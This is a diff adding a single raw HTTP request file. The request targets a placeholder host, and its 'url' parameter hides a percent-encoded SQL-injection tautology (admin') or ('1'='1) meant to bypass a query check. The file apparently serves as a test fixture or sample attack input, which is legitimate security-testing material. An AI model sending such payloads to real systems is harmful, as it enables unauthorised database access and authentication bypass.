@@ -1,0 +1,4 @@
+GET /a?url=%61%64%6D%69%6E%27%29%20%6F%72%20%28%27%31%27%3D%27%31 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
